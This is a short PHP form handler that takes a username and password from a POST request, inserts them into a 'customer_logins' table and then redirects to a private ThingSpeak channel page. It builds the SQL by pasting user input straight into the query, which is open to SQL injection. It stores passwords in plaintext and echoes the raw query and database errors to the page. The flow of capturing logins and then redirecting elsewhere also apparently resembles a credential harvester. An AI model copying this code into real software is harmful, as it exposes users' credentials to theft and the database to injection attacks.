<?php
include_once 'Config.php';

if(isset($_POST['save']))
{	 
	 $user = $_POST['user'];
	 $pass = $_POST['pass'];
	 $sql = "INSERT INTO customer_logins (user,pass)
	 VALUES ('$user','$pass')";
	 if (mysqli_query($db, $sql)) {
		//echo "New record created successfully !";
        header("location: https://thingspeak.com/channels/2015529/private_show");

	 } else {
		echo "Error: " . $sql . "
" . mysqli_error($db);
	 }
	 mysqli_close($db);
}


?>